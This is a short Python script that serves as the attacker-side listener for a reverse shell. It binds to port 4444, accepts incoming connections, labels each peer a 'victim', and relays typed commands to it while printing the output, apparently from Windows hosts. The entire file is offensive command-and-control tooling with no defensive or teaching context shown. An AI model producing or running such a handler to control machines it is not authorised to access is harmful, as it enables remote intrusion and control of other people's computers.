import socket
import time

attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
attacker.bind(('127.0.0.1', 4444))
attacker.listen(5)

while True:
    print('Waiting for connections...\n')

    client, addr = attacker.accept()
    print(f'Connection from: {addr}\n')

    def pwd(victim: socket.socket):
        victim.send(b'echo %cd%')

        return victim.recv(1024).decode().strip()

    while True:
        command = input(f'{pwd(client)}> ')
        client.send(command.encode())

        if command.lower() == 'exit':
            break

        output = client.recv(4096).decode('cp866')
        print(output)

    client.close()
    time.sleep(1)